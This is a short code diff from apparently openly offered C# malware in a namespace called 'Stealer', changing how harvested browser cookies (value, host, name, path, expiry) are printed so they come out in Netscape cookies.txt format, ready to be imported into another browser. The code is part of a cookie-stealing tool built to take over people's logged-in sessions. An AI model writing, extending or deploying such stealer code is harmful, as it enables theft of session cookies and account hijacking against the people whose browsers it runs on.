@@ -59,7 +59,8 @@ namespace Stealer
 
                         foreach (string[] data in Cookies.get())
                         {
-                            Console.WriteLine("\n[COOKIE]\nValue: " + data[0] + "\nHostKey: " + data[1] + "\nName: " + data[2] + "\nPath: " + data[3] + "\nExpires: " + data[4] + "\nisSecure: " + data[5]);
+                             //Netscape convert
+                             Console.Write(String.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", data[1], data[3], data[4], data[2], data[0]));
                         }
                         break;
                     }
